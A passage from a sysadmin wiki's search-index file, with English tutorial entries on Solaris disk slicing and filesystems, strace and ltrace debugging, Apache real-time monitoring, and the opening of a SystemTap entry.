8.43GB (4924/0/0) 17682084 3 unassigned wu 0 0 (0/0/0) 0 4 unassigned wm 0 0 (0/0/0) 0 5 unassigned wm 0 0 (0/0/0) 0 6 unassigned wu 0 0 (0/0/0) 0 7 unassigned wm 0 0 (0/0/0) 0 Here is the meaning of the columns:\nColumn Name Description Part Slice number of the disk Tag Predefined tag (optional) Flag Predefined flag (optional) Cylinders Start and end cylinder of the slice Size Size of the slice in blocks (b), cylinders (c), Mbytes (MB), or Gbytes (GB) Blocks Total number of cylinders and sectors per slice To start configuring the disk, type 0:\npartition\u003e 0 Part Tag Flag Cylinders Size Blocks 0 unassigned wm 0 0 (0/0/0) 0 Type ? to get the list of possible choices:\nEnter partition id tag[unassigned]: ? Expecting one of the following: (abbreviations ok): unassigned boot root swap usr backup stand var home alternates reserved Enter partition id tag[unassigned]: Type alternates:\nEnter partition id tag[unassigned]: alternates Type ? to get the list of possible choices:\nEnter partition permission flags[wm]: ? Expecting one of the following: (abbreviations ok): wm - read-write, mountable wu - read-write, unmountable rm - read-only, mountable ru - read-only, unmountable Enter partition permission flags[wm]: Press the “Enter” key:\nEnter partition permission flags[wm]: Press “Enter” again to accept cylinder 0 as starting point:\nEnter new starting cyl[0]: Enter the size of the partition (here 980mb):\nEnter partition size[0b, 0c, 0e, 0.00mb, 0.00gb]: 980mb Let’s check:\npartition\u003e print Current partition table (unnamed): Total disk cylinders available: 1965 + 2 (reserved cylinders) Part Tag Flag Cylinders Size Blocks 0 alternates wm 0 - 558 980.16MB (559/0/0) 200736 1 unassigned wm 0 0 (0/0/0) 0 2 backup ru 0 - 4923 8.43GB (4924/0/0) 17682084 3 unassigned wm 0 0 (0/0/0) 0 4 unassigned wm 0 0 (0/0/0) 0 5 unassigned wm 0 0 (0/0/0) 0 6 unassigned wu 0 0 (0/0/0) 0 7 unassigned wm 0 0 (0/0/0) 0 We can see the changes. Let’s adjust the start cylinder of slice 1:\npartition\u003e 1 Part Tag Flag Cylinders Size Blocks 1 unassigned wm 0 0 (0/0/0) 0 Enter “swap”:\nEnter partition id tag[unassigned]: swap Type “wu”:\nEnter partition permission flags[wm]: wu Enter the start cylinder of slice 1:\nEnter new starting cyl[0]: 559 Enter the new size of the partition:\nEnter partition size[0b, 0c, 603e, 0.00mb, 0.00gb]: 512mb Let’s check:\npartition\u003e print Current partition table (unnamed): Total disk cylinders available: 1965 + 2 (reserved cylinders) Part Tag Flag Cylinders Size Blocks 0 alternates wm 0 - 558 980.16MB (559/0/0) 2007369 1 swap wu 559 - 851 513.75MB (293/0/0) 1052163 2 backup ru 0 - 4923 8.43GB (4924/0/0) 17682084 3 unassigned wm 0 0 (0/0/0) 0 4 unassigned wm 0 0 (0/0/0) 0 5 unassigned wm 0 0 (0/0/0) 0 6 unassigned wu 0 0 (0/0/0) 0 7 unassigned wm 0 0 (0/0/0) 0 Let’s do the same for slice 7:\npartition\u003e 7 Part Tag Flag Cylinders Size Blocks 7 unassigned wm 0 0 (0/0/0) 0 Type “home”:\nEnter partition id tag[unassigned]: home Press the “Enter” key:\nEnter partition permission flags[wm]: Enter the starting cylinder:\nEnter new starting cyl[0]: 852 Enter the value “$” to occupy all available free space in this partition:\nEnter partition size[0b, 0c, 694e, 0.00mb, 0.00gb]: $ Let’s check:\npartition\u003e print Current partition table (unnamed): Total disk cylinders available: 1965 + 2 (reserved cylinders) Part Tag Flag Cylinders Size Blocks 0 alternates wm 0 - 558 980.16MB (559/0/0) 2007369 1 swap wu 559 - 851 513.75MB (293/0/0) 1052163 2 backup ru 0 - 4923 8.43GB (4924/0/0) 17682084 3 unassigned wm 0 0 (0/0/0) 0 4 unassigned wm 0 0 (0/0/0) 0 5 unassigned wm 0 0 (0/0/0) 0 6 unassigned wu 0 0 (0/0/0) 0 7 home wm 852 - 4923 6.97GB (4072/0/0) 14622552 After checking that there are no errors, type label:\npartition\u003e label Ready to label disk, continue? y Checking Labels linkTo check labels (also called VTOC), there are 2 solutions:\nUse verify in the format utility Use the prtvtoc command Reading the VTOC with Format linkOpen the format utility, then type verify:\nformat\u003e verify Primary label contents: Volume name = \u003c \u003e ascii name = pcyl = 4926 ncyl = 4924 acyl = 2 nhead = 27 nsect = 133 Part Tag Flag Cylinders Size Blocks 0 alternates wm 0 - 558 980.16MB (559/0/0) 2007369 1 swap wu 559 - 851 513.75MB (293/0/0) 1052163 2 backup ru 0 - 4923 8.43GB (4924/0/0) 17682084 3 unassigned wu 0 0 (0/0/0) 0 4 unassigned wm 0 0 (0/0/0) 0 5 unassigned wm 0 0 (0/0/0) 0 6 unassigned wu 0 0 (0/0/0) 0 7 home wm 852 - 4923 6.97GB (4072/0/0) 14622552 To quit, type q.\nReading the VTOC with Prtvtoc linkRun the command on a disk:\nprtvtoc /dev/dsk/c1t3d0s0 * /dev/dsk/c1t3d0s0 partition map * * Dimensions: * 512 bytes/sector * 133 sectors/track * 27 tracks/cylinder * 3591 sectors/cylinder * 4926 cylinders * 4924 accessible cylinders * * Flags: * 1: unmountable * 10: read-only * * First Sector Last * Partition Tag Flags Sector Count Sector Mount Directory 0 9 00 0 2007369 2007368 1 3 01 2007369 1052163 3059531 2 5 11 0 17682084 17682083 7 8 00 3059532 14622552 17682083 Here are some explanations:\nField Description Dimensions Describes the logical dimensions of the disk Flags Describes the flags listed in the partition table Partition The slice number described later in the partition table Tag Value used to specify how the disk will be used, described later in the partition table Flags Flag 00 is for “read/write, mountable”; 01 is “read/write, unmountable”; and 10 is “read only” First Sector Defines the first sector for the slice Sector Count Defines the total number of sectors in the slice Last Sector Defines the last sector in the slice Mount Directory If this field is empty, no entry will be defined in “/etc/vfstab” and the slice will not be mounted at startup In Case of Problems linkRelabeling Disks linkThe fmthard command allows you to relabel disks. First, let’s save the current VTOC in a file:\nprtvtoc /dev/dsk/c1t3d0s0 \u003e /var/tmp/c1t3d0.vtoc We can save the VTOC of another disk in a file to relabel it on a new disk:\nfmthard -s datafile /dev/rdsk/c#t#d#s2 Open format, select the disk and give it the desired name. Then reinject the saved VTOC:\nmthard -s /var/tmp/c1t3d0.vtoc /dev/rdsk/c1t3d0s2 Finally, to initialize the disk:\nfmthard -s /dev/null /dev/rdsk/c1t3d0s2 FileSystems linkThere are 4 types of FileSystems in Solaris:\nufs: The most used FileSystem in Solaris. It can easily go up to Terabits, is based on the Berkeley system hsfs: A somewhat special Sierra system pcfs: For FAT32 and DOS udfs: Universal Disk File System, this is for CD/DVD media… Here is a description of UFS:\nAs well as how inodes work:\nCreating the FileSystem linkThe newfs command allows you to do this:\nnewfs /dev/rdsk/c1t3d0s7 Answer y to this confirmation:\nnewfs: construct a new file system /dev/rdsk/c1t3d0s7: (y/n)? It now displays information about the filesystem creation:\n/dev/rdsk/c1t3d0s7: 6295022 sectors in 1753 cylinders of 27 tracks, 133 sectors 3073.7MB in 110 cyl groups (16 c/g, 28.05MB/g, 3392 i/g) super-block backups (for fsck -F ufs -o b=#) at: 32, 57632, 115232, 172832, 230432, 288032, 345632, 403232, 460832, 518432, 5746208, 5803808, 5861408, 5919008, 5976608, 6034208, 6091808, 6149408, 6207008, 6264608, We display the free space\nfstyp -v /dev/dsk/c0t1d0s6 |head (output omitted for brevity) minfree 10% maxbpg 2048 optim time The -m option defines the percentage of disk space we want to use:\nnewfs -m 2 /dev/dsk/c0t1d0s6 newfs: construct a new file system /dev/rdsk/c0t1d0s6: (y/n)? y (output omitted for brevity) Here’s the result:\nfstyp -v /dev/dsk/c0t1d0s6 |head (output omitted for brevity minfree 2% maxbpg 2048 optim time Verification:\nfstyp -v /dev/rdsk/c0t0d0s0 | head ufs magic 11954 format dynamic time Fri Oct 22 10:09:11 2004 sblkno 16 cblkno 24 iblkno 32 dblkno 456 sbsize 5120 cgsize 5120 cgoffset 72 cgmask 0xffffffe0 ncg 110 size 3147511 blocks 3099093 bsize 8192 shift 13 mask 0xffffe000 fsize 1024 shift 10 mask 0xfffffc00 frag 8 shift 3 fsbtodb 1 minfree 2% maxbpg 2048 optim time maxcontig 128 rotdelay 0ms rps 120 To change the available space:\ntunefs -m 1 /dev/rdsk/c0t0d0s0 minimum percentage of free space changes from 10% to 1% Checking Disk Status linkThe fsck command, like in Linux, allows you to check the integrity of the filesystem to repair any orphaned inodes (don’t forget to unmount the partition before performing this operation):\nfsck /dev/rdsk/c0t0d0s7 ** /dev/rdsk/c0t0d0s7 ** Last Mounted on /export/home ** Phase 1 - Check Blocks and Sizes INCORRECT BLOCK COUNT I=743 (5 should be 2) CORRECT? If there are files that can be recovered, you will find them in “lost+found”. Check if they are correct with the “file” command. It is estimated that if “file” can determine what type of file it is, then it’s correct.\nVfstab linkThe /etc/vfstab file is the equivalent of /etc/fstab in Linux. It lists all partitions and their mount points.\n#device device mount FS fsck mount mount #to mount to fsck point type pass at boot options # fd - /dev/fd fd - no - /proc - /proc proc - no - /dev/dsk/c0t0d0s1 - - swap - no - /dev/dsk/c0t0d0s0 /dev/rdsk/c0t0d0s0 / ufs 1 no - /dev/dsk/c0t0d0s6 /dev/rdsk/c0t0d0s6 /usr ufs 1 no - /dev/dsk/c0t0d0s3 /dev/rdsk/c0t0d0s3 /var ufs 1 no - /dev/dsk/c0t0d0s7 /dev/rdsk/c0t0d0s7 /export/home ufs 2 yes - /devices - /devices devfs - no - ctfs - /system/contract ctfs - no - objfs - /system/object objfs - no - swap - /tmp tmpfs - yes - mtab linkThe /etc/mtab file informs us about mountings in relation to the kernel:\nmore /etc/mnttab /dev/dsk/c0t0d0s0 / ufs rw,intr,largefiles,logging,xattr,onerror=panic,dev=2200008 1098604644 /devices /devices devfs dev=4a80000 1098604620 ctfs /system/contract ctfs dev=4ac0001 1098604620 proc /proc proc dev=4b00000 1098604620 mnttab /etc/mnttab mntfs dev=4b40001 1098604620 swap /etc/svc/volatile tmpfs xattr,dev=4b80001 1098604620 objfs /system/object objfs dev=4bc0001 1098604620 /dev/dsk/c0t0d0s6 /usr ufs rw,intr,largefiles,logging,xattr,onerror=panic,dev=220000e 1098604645 fd /dev/fd fd rw,dev=4d40001 1098604645 /dev/dsk/c0t0d0s3 /var ufs rw,intr,largefiles,logging,xattr,onerror=panic,dev=220000b 1098604647 swap /var/run tmpfs xattr,dev=4b80002 1098604647 swap /tmp tmpfs xattr,dev=4b80003 1098604647 /dev/dsk/c0t0d0s7 /export/home ufs rw,intr,largefiles,logging,xattr,onerror=panic,dev=220000f 1098604661 -hosts /net autofs nosuid,indirect,ignore,nobrowse,dev=4dc0001 1098604678 auto_home /home autofs indirect,ignore,nobrowse,dev=4dc0002 1098604678 sys-01:vold(pid491) /vol nfs ignore,noquota,dev=4e00001 1098604701 mount / on /dev/dsk/c0t0d0s0 read/write/setuid/devices/intr/largefiles/logging/xattr/onerror=panic/dev=2200008 on Sun Oct 24 08:57:24 2004 /devices on /devices read/write/setuid/devices/dev=4a80000 on Sun Oct 24 08:57:00 2004 /system/contract on ctfs read/write/setuid/devices/dev=4ac0001 on Sun Oct 24 08:57:00 2004 /proc on proc read/write/setuid/devices/dev=4b00000 on Sun Oct 24 08:57:00 2004 /etc/mnttab on mnttab read/write/setuid/devices/dev=4b40001 on Sun Oct 24 08:57:00 2004 /etc/svc/volatile on swap read/write/setuid/devices/xattr/dev=4b80001 on Sun Oct 24 08:57:00 2004 /system/object on objfs read/write/setuid/devices/dev=4bc0001 on Sun Oct 24 08:57:00 2004 /usr on /dev/dsk/c0t0d0s6 read/write/setuid/devices/intr/largefiles/logging/xattr/onerror=panic/dev=220000e on Sun Oct 24 08:57:25 2004 /dev/fd on fd read/write/setuid/devices/dev=4d40001 on Sun Oct 24 08:57:25 2004 /var on /dev/dsk/c0t0d0s3 read/write/setuid/devices/intr/largefiles/logging/xattr/onerror=panic/dev=220000b on Sun Oct 24 08:57:27 2004 /var/run on swap read/write/setuid/devices/xattr/dev=4b80002 on Sun Oct 24 08:57:27 2004 /tmp on swap read/write/setuid/devices/xattr/dev=4b80003 on Sun Oct 24 08:57:27 2004 /export/home on /dev/dsk/c0t0d0s7 read/write/setuid/devices/intr/largefiles/logging/xattr/onerror=panic/dev=220000f on Sun Oct 24 08:57:41 2004 Mounting Partitions linkTo manually mount partitions, there is the mount command. Here are some examples:\nMount the filesystem as read-only:\nmount -o ro /dev/dsk/c0t0d0s7 /export/home Set sticky bits across the entire partition:\nmount -o ro,nosuid /dev/dsk/c0t0d0s7 /export/home Remove access dates for each file, which optimizes access times\nmount -o noatime /dev/dsk/c0t0d0s7 /export/home If this partition only contains small files, use this option:\nmount -o nolargefiles /dev/dsk/c0t0d0s7 /export/home To mount all the contents of your /etc/vfstab file, use this command:\nmountall To only mount what is local:\nmountall -l Determining the Mount Type linkTo know which options to pass, here are some interesting files:\n/etc/vfstab for FS /etc/default/fs for a local filesystem /etc/dfs/fstypes for remote filesystems To know the characteristics of a partition:\nfstyp /dev/rdsk/c0t0d0s7 ufs You can specify during partition mounting if it’s hsfs or pcfs:\nmount -F hsfs -o ro /dev/dsk/c0t6d0s0 /cdrom To unmount a partition, do this:\numount mount_point And to force, use the -f option:\numount -f mount_point What’s Happening on My Partition? linkfuser is what allows in Solaris to know what’s happening on the partition. In Linux, it’s lsof. To list all processes running on this partition:\nfuser -cu mount_point To kill all processes:\nfuser -ck mount_point Check that no processes are on the partition:\nfuser -c mount_point Problems with My Root Partition linkIf you want to fsck the root partition, insert the Sun CD/DVD then type this:\nok boot cdrom -s Boot device: /pci@1f,0/pci@1,1/ide@3/cdrom@2,0:f File and args -s SunOS Release 5.10 Generic 64 bit Copyright 1983-2004 by Sun Microsystems, Inc. All rights reserved. Booting to milestone \"milestone/single-user:default\" Configuring /dev and /devices Use is subject to license terms Using RPC Bootparams for network configuration information. Skipping interface hme0 - INIT: SINGLE USER MODE Run fsck on your root partition:\nfsck /dev/rdsk/c0t0d0s0 If everything worked well, you should be able to mount everything:\nmount /dev/dsk/c0t0d0s0 /a Otherwise, you need to fine-tune /etc/vfstab:\nTERM=sun export TERM vi /a/etc/vfstab Then we exit and restart:\ncd / umount /a Access to Removable Devices linkWith Vold linkWhere to find the peripherals:\nMedia Filesystem Access Mounted Access diskette /floppy/floppy0 /vol/dev/aliases/floppy0 CD-ROM /cdrom/cdrom0 /vol/dev/aliases/cdrom0 Jaz /rmdisk/jaz0 /vol/dev/aliases/jaz0 Zip /rmdrive/zip0 /vol/dev/aliases/zip0 PCMCIA /pcmem0 /vol/dev/aliases/pcmem0 There are 2 files that manage actions during media insertion/ejection:\n/etc/vold.conf /etc/rmmount.conf Vold is a service (start, stop…):\n/etc/init.d/volmgt restart If it really doesn’t want to quit:\npkill -9 vold Without Vold linkObviously you have to do everything manually:\nmount -F hsfs -o ro /dev/dsk/c0t6d0s0 /cdrom mount -F pcfs /dev/diskette /pcfs "
            }
        );
    index.add(
            {
                id:  369 ,
                href: "\/Strace_et_Ltrace_:_tracez_les_appels_syst%C3%A8mes_et_librairies\/",
                title: "Strace and Ltrace: Trace System and Library Calls",
                description: "How to use strace and ltrace tools to monitor system calls and library calls for debugging and troubleshooting on Linux systems",
                content: "Introduction linkstrace is a debugging tool on Linux used to monitor system calls made by a program and all the signals it receives, similar to the “truss” tool on other Unix systems. It’s made possible through a Linux kernel feature called ptrace.\nThe most common use is to launch a program using strace, which displays a list of system calls made by the program. This is useful when a program continually crashes or doesn’t behave as expected. For example, using strace can reveal that the program is trying to access a file that doesn’t exist or can’t be read.\nAnother use is to use the -p option to attach it to a running program. This is useful when a program stops responding, and can reveal, for example, that the process is blocked waiting to make a network connection.\nSince strace only details system calls, it can’t be used as a code debugger like Gdb. However, it remains simpler to use than a code debugger and is an extremely useful tool for system administrators.\nIn this documentation, I won’t discuss ltrace much because its usage is quite similar to strace.\nInstallation linkDebian linkTo install on Debian:\naptitude install strace ltrace Red Hat link yum install strace ltrace Usage linkFor example, if we want to debug an issue with an Apache server:\n\u003e strace -f /etc/init.d/httpd restart execve(\"/etc/init.d/httpd\", [\"/etc/init.d/httpd\", \"restart\"], [/* 32 vars */]) = 0 brk(0) = 0x1c61000 mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ff218642000 access(\"/etc/ld.so.preload\", R_OK) = -1 ENOENT (No such file or directory) open(\"/etc/ld.so.cache\", O_RDONLY) = 3 fstat(3, {st_mode=S_IFREG|0644, st_size=31346, ...}) = 0 mmap(NULL, 31346, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7ff21863a000 close(3) = 0 open(\"/lib64/libtinfo.so.5\", O_RDONLY) = 3 read(3, \"\\177ELF\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\u003e\\0\\1\\0\\0\\0@\\310@\\331=\\0\\0\\0\"..., 832) = 832 ... The -f option of strace traces child processes as they are created by currently traced processes following the fork system call.\nAll you need to do is analyze the lines to see the issue. This can be tedious depending on the number of lines, but generally the information about your problem is here.\nRedirecting Output to a File linkIf we want to redirect all of strace’s output (initially on error output) to a file using the -o option:\nstrace -o apache -f /etc/init.d/httpd restart Working with Standard Output linkAs you now know, strace works on error output, so if you want to work on it with grep or other commands on-the-fly (without redirecting to a file), you’ll need to use redirection:\nstrace -f /etc/init.d/httpd restart 2\u003e\u00261 Working with Specific Kernel Calls Only linkIf you want to get only open and access type calls, for example:\nstrace -e open,access ls Here are some examples of system calls you can try:\nstrace -e trace=set strace -e trace=open strace -e trace=read strace -e trace=file strace -e trace=process strace -e trace=network strace -e trace=signal strace -e trace=ipc strace -e trace=desc //descriptors strace -e read=set Increasing the Number of Characters to Display linkYou can increase the display size using the -s option followed by the desired size (5000 for example):\nstrace -o apache -f -s 5000 /etc/init.d/httpd restart Attaching to an Existing PID linkIf we want to trace a process that’s already running, it’s possible. To do this, simply use the -p argument:\nstrace -f -s 5000 -p Getting Statistics linkIf you want to get statistics, we’ll use the -c option:\n\u003e strace -c uname Linux % time seconds usecs/call calls errors syscall ------ ----------- ----------- --------- --------- ---------------- -nan 0.000000 0 1 read -nan 0.000000 0 1 write -nan 0.000000 0 3 open -nan 0.000000 0 5 close -nan 0.000000 0 4 fstat -nan 0.000000 0 10 mmap -nan 0.000000 0 3 mprotect -nan 0.000000 0 2 munmap -nan 0.000000 0 3 brk -nan 0.000000 0 1 1 access -nan 0.000000 0 1 execve -nan 0.000000 0 1 uname -nan 0.000000 0 1 arch_prctl ------ ----------- ----------- --------- --------- ---------------- 100.00 0.000000 36 1 total Detecting Network Problems linkIf, for example, you only want to work on a network layer, here’s the solution:\nstrace -e poll,select,connect,recvfrom,sendto nc www.deimos.fr 80 Example linkHere’s an example of this command with some explanations to help you get started with a ’ls’ command:\n# Reading an l from the keyboard read(10, \"l\"..., 1) = 1 # Writing the l to the screen (the one it just read) write(10, \"l\"..., 1) = 1 # Reading the s read(10, \"s\"..., 1) = 1 # writing the s write(10, \"\\10ls\"..., 3) = 3 # reading the enter key (in C) read(10, \" \"..., 1) = 1 write(10, \" \"..., 2) = 2 alarm(0) = 0 ioctl(10, SNDCTL_TMR_STOP or TCSETSW, {B38400 opost isig icanon echo ...}) = 0 time(NULL) = 1229629587 pipe([3, 4]) = 0 gettimeofday({1229629587, 864550}, {0, 0}) = 0 # clone ----\u003e a new process is created, in fact fork() executes the clone system call, the new pid is 4024 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7ddd998) = 4024 close(4) = 0 read(3, \"\"..., 1) = 0 close(3) = 0 rt_sigprocmask(SIG_BLOCK, [CHLD], [CHLD], 8) = 0 rt_sigsuspend([]) = ? ERESTARTNOHAND (To be restarted) --- SIGCHLD (Child exited) @ 0 (0) --- rt_sigprocmask(SIG_BLOCK, ~[RTMIN RT_1], [CHLD], 8) = 0 rt_sigprocmask(SIG_SETMASK, [CHLD], ~[KILL STOP RTMIN RT_1], 8) = 0 # The end of the child process (4024) wait4(-1, [{WIFEXITED(s) \u0026\u0026 WEXITSTATUS(s) == 0}], WNOHANG|WSTOPPED, {ru_utime={0, 0}, ru_stime={0, 0}, ...}) = 4024 gettimeofday({1229629587, 867012}, {0, 0}) = 0 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, {B38400 opost isig icanon echo ...}) = 0 ioctl(10, TIOCGPGRP, [4024]) = 0 ioctl(10, TIOCSPGRP, [3982]) = 0 ioctl(10, TIOCGWINSZ, {ws_row=38, ws_col=127, ws_xpixel=1270, ws_ypixel=758}) = 0 wait4(-1, 0xbfe3f48c, WNOHANG|WSTOPPED, 0xbfe3f434) = -1 ECHILD (No child processes) # It wonders what time it is :-) time(NULL) = 1229629587 ioctl(10, TIOCSPGRP, [3982]) = 0 fstat64(0, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 3), ...}) = 0 fcntl64(0, F_GETFL) = 0x2 (flags O_RDWR) # It wonders under which UID it is running getuid32() = 1000 # It rewrites the prompt write(1, \"\\33]0;phil@philpep.ath.cx ~\\7\"..., 26) = 26 rt_sigprocmask(SIG_BLOCK, [CHLD], [CHLD], 8) = 0 # It asks again what time it is time(NULL) = 1229629587 rt_sigaction(SIGINT, {0x80a8fd0, [], SA_INTERRUPT}, NULL, 8) = 0 write(10, \"\\33[1m\\33[3m%\\33[23m\\33[1m\\33[0m \"..., 149) = 149 time(NULL) = 1229629587 # It opens the file /etc/localtime stat64(\"/etc/localtime\", {st_mode=S_IFREG|0644, st_size=2945, ...}) = 0 ioctl(10, FIONREAD, [0]) = 0 ioctl(10, TIOCSPGRP, [3982]) = 0 ioctl(10, SNDCTL_TMR_STOP or TCSETSW, {B38400 opost isig -icanon -echo ...}) = 0 write(10, \" \\33[0m\\33[23m\\33[24m\\33[J\\33[01;30m[\\33[01;3\"..., 105) = 105 write(10, \"\\33[K\\33[81C \\33[01;30m18/12/08 20:46:\"..., 46) = 46 # It waits for a new input read(10, Process 3982 detached Resources link http://blog.philpep.org/post/Que-font-vos-processus---La-commande-strace http://www.hokstad.com/5-simple-ways-to-troubleshoot-using-strace.html "
            }
        );
    index.add(
            {
                id:  370 ,
                href: "\/Monitorer_en_temps_r%C3%A9el_votre_Apache\/",
                title: "Real-time monitoring of your Apache server",
                description: "How to monitor your Apache server in real-time using various tools like mod_status and apachetop.",
                content: "Introduction linkIt can sometimes be useful to monitor an Apache server, especially when there is an abnormal load. That’s why we’re going to look at some tools to help monitor Apache connections and status in real time.\nMod Status linkMod status is an Apache module that displays very interesting information. It has the advantage of being native to Apache.\nInstallation linkTo activate the module, it’s very simple:\na2enmod info Configuration linkThen we’ll add this configuration to Apache’s default VirtualHost:\n# Get Extended informations ExtendedStatus On SetHandler server-info Order deny,allow Deny from all Allow from localhost ip6-localhost # Allow from .example.com You just need to reload the service.\nUtilization linkNow you just need to type your server’s URL (the permissions here only allow localhost): http://localhost/server-status\nApache Server Status for 127.0.0.1 Server Version: Apache/2.2.14 (Ubuntu) mod_fcgid/2.3.5 mod_python/3.3.1 Python/2.6.5 mod_ssl/2.2.14 OpenSSL/0.9.8k mod_perl/2.0.4 Perl/v5.10.1 Server Built: Nov 3 2011 03:29:23 Current Time: Wednesday, 18-Jan-2012 14:22:34 CET Restart Time: Wednesday, 18-Jan-2012 13:33:58 CET Parent Server Generation: 4 Server uptime: 48 minutes 35 seconds Total accesses: 743 - Total Traffic: 2.2 MB CPU Usage: u28.08 s1.23 cu0 cs0 - 1.01% CPU load .255 requests/sec - 782 B/second - 3070 B/request 1 requests currently being processed, 9 idle workers .____W.._____................................................... ................................................................ ................................................................ ................................................................ Scoreboard Key: \"_\" Waiting for Connection, \"S\" Starting up, \"R\" Reading Request, \"W\" Sending Reply, \"K\" Keepalive (read), \"D\" DNS Lookup, \"C\" Closing connection, \"L\" Logging, \"G\" Gracefully finishing, \"I\" Idle cleanup of worker, \".\" Open slot with no current process Srv\tPID\tAcc\tM\tCPU SS\tReq\tConn\tChild\tSlot\tClient\tVHost\tRequest 0-4\t-\t0/0/109\t. 0.04\t1561\t0\t0.0\t0.00\t0.43 127.0.0.1\tdeimos.fr\tOPTIONS * HTTP/1.0 1-4\t27635\t0/18/71\t_ 1.07\t42\t0\t0.0\t0.03\t0.18 shenzi.deimos.fr\tdeimos.fr\tNULL 2-4\t27780\t0/8/45\t_ 1.38\t58\t1\t0.0\t0.01\t0.22 shenzi.deimos.fr\tdeimos.fr\tGET /server-status HTTP/1.1 3-4\t27637\t0/21/57\t_ 1.06\t56\t1\t0.0\t0.03\t0.26 shenzi.deimos.fr\tdeimos.fr\tGET /server-status HTTP/1.1 4-4\t28534\t0/11/62\t_ 1.11\t57\t1\t0.0\t0.00\t0.24 shenzi.deimos.fr\tdeimos.fr\tGET /server-status HTTP/1.1 5-4\t27644\t0/16/27\tW 11.82\t0\t0\t0.0\t0.08\t0.09 88.191.130.125\tdeimos.fr\tGET /server-status HTTP/1.1 6-4\t-\t0/0/24\t. 0.08\t1672\t0\t0.0\t0.00\t0.04 127.0.0.1\tdeimos.fr\tOPTIONS * HTTP/1.0 7-4\t-\t0/0/43\t. 0.60\t1675\t0\t0.0\t0.00\t0.14 127.0.0.1\tdeimos.fr\tOPTIONS * HTTP/1.0 8-4\t27647\t0/14/62\t_ 0.99\t55\t1\t0.0\t0.04\t0.10 shenzi.deimos.fr\tdeimos.fr\tGET /server-status HTTP/1.1 9-4\t27633\t0/19/58\t_ 2.26\t57\t1\t0.0\t0.02\t0.12 shenzi.deimos.fr\tdeimos.fr\tGET /server-status HTTP/1.1 10-4\t27634\t0/18/57\t_ 2.84\t54\t1\t0.0\t0.02\t0.10 shenzi.deimos.fr\tdeimos.fr\tGET /server-status HTTP/1.1 11-4\t27648\t0/14/54\t_ 0.52\t56\t1\t0.0\t0.02\t0.13 shenzi.deimos.fr\tdeimos.fr\tGET /server-status HTTP/1.1 12-4\t27782\t0/10/30\t_ 1.03\t59\t1\t0.0\t0.01\t0.05 shenzi.deimos.fr\tdeimos.fr\tGET /server-status HTTP/1.1 13-4\t-\t0/0/23\t. 2.13\t1671\t0\t0.0\t0.00\t0.07 127.0.0.1\tdeimos.fr\tOPTIONS * HTTP/1.0 14-4\t-\t0/0/9\t. 1.03\t1676\t0\t0.0\t0.00\t0.02 127.0.0.1\tdeimos.fr\tOPTIONS * HTTP/1.0 15-4\t-\t0/0/4\t. 1.35\t1674\t0\t0.0\t0.00\t0.00 127.0.0.1\tdeimos.fr\tOPTIONS * HTTP/1.0 16-4\t-\t0/0/3\t. 0.00\t1686\t0\t0.0\t0.00\t0.00 127.0.0.1\tdeimos.fr\tOPTIONS * HTTP/1.0 17-4\t-\t0/0/3\t. 0.00\t1684\t0\t0.0\t0.00\t0.00 127.0.0.1\tdeimos.fr\tOPTIONS * HTTP/1.0 18-4\t-\t0/0/1\t. 0.00\t1685\t0\t0.0\t0.00\t0.00 127.0.0.1\tdeimos.fr\tOPTIONS * HTTP/1.0 19-4\t-\t0/0/1\t. 0.00\t1677\t0\t0.0\t0.00\t0.00 127.0.0.1\tdeimos.fr\tOPTIONS * HTTP/1.0 Srv\tChild Server number - generation PID\tOS process ID Acc\tNumber of accesses this connection / this child / this slot M\tMode of operation CPU\tCPU usage, number of seconds SS\tSeconds since beginning of most recent request Req\tMilliseconds required to process most recent request Conn\tKilobytes transferred this connection Child\tMegabytes transferred this child Slot\tTotal megabytes transferred this slot mod_fcgid status: Total FastCGI processes: 0 SSL/TLS Session Cache Status: cache type: SHMCB, shared memory: 512000 bytes, current sessions: 0 subcaches: 32, indexes per subcache: 133 index usage: 0%, cache usage: 0% total sessions stored since starting: 0 total sessions expired since starting: 0 total (pre-expiry) sessions scrolled out of the cache: 0 total retrieves since starting: 0 hit, 0 miss total removes since starting: 0 hit, 0 miss It’s normal to see several keep-alives managed by the Apache workers. If you see too many, it means they’re keeping connections open for too long. For that, lower the connection reservation time with the KeepAliveTimeout option.\nIf you see several “.” inactive, you should increase the MaxClients value to ensure enough free slots for new connections. This increases the responsiveness, but also increases memory usage.\nApachetop linkApachetop displays accessed pages similar to the top command.\nInstallation linkOn Debian, it’s easy:\naptitude install apachetop Utilization linkFor use:\n\u003e apachetop -f /var/log/apache2/access.log last hit: 00:00:00 atop runtime: 0 days, 00:01:55 13:41:33 All: 0 reqs ( 0.0/sec) 0.0B ( 0.0B/sec) 0.0B/req 2xx: 0 ( 0.0%) 3xx: 0 ( 0.0%) 4xx: 0 ( 0.0%) 5xx: 0 ( 0.0%) R ( 30s): 0 reqs ( 0.0/sec) 0.0B ( 0.0B/sec) 0.0B/req 2xx: 0 ( 0.0%) 3xx: 0 ( 0.0%) 4xx: 0 ( 0.0%) 5xx: 0 ( 0.0%) ... Resources linkhttp://articles.slicehost.com/2010/3/26/enabling-and-using-apache-s-mod_status-on-debian\n"
            }
        );
    index.add(
            {
                id:  371 ,
                href: "\/SystemTap_:_Profilez_et_utilisez_rapidement_des_fonctionnalit%C3%A9s_du_kernel\/",
                title: "SystemTap: Profile and Quickly Use Kernel Features",
                description: "Learn how to use SystemTap to analyze and diagnose performance issues in Linux systems without kernel recompilation or rebooting.",
                content: " Introduction linkSystemTap is a software tool that simplifies information gathering on a Linux system. It allows you to analyze and diagnose performance or functionality issues. It eliminates the need for kernel recompilation, rebooting, and other steps typically required for low-level data collection.\nSystemTap provides a command-line interface similar to awk and a C-like scripting language that allows you to write tools directly for a live kernel. Beyond tracing/probing, it’s useful for complex tasks requiring real-time analysis and programmatic responses to events.\nSystemTap can profile all system calls that use kprobes. Unlike OProfile, SystemTap captures 100% of events.\nOne major advantage of SystemTap is that it was designed to be run in production environments. This means you can have:\nA development machine: Where you compile and test SystemTap kernel modules with all the tools and libraries necessary for proper development. Production machines: With minimal packages installed, just the desired compiled module retrieved from the development machine. Installation linkRed Hat 